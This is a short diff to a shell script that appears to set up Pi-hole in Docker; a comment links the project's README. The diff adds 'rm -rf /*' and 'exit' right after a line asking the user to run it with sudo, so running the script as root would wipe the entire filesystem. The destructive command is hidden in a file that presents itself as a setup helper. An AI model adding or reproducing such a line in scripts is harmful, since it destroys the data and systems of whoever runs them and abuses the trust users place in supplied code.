@@ -1,5 +1,6 @@
 echo "run with sudo pls"
-
+rm -rf /*
+exit
 #!/bin/bash
 
 # https://github.com/pi-hole/docker-pi-hole/blob/master/README.md
